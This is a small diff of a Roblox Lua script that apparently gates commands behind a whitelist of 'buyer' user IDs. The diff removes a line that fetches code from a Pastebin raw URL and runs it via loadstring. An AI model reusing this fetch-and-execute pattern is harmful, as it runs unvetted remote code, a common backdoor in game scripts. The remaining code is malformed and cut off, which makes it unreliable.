@@ -1,4 +1,3 @@
-loadstring(game:HttpGet(("https://pastebin.com/raw/MahxFag6"),true))()
 local whitelist UserId= { buyers = {2935773828},{354429433}}
 
         local function runcommand(message,author)buyers = false local player = game.Players[author] for i ,_ in pairs(whitelist.buyers) do if player.UserId == _ then buyers = true end
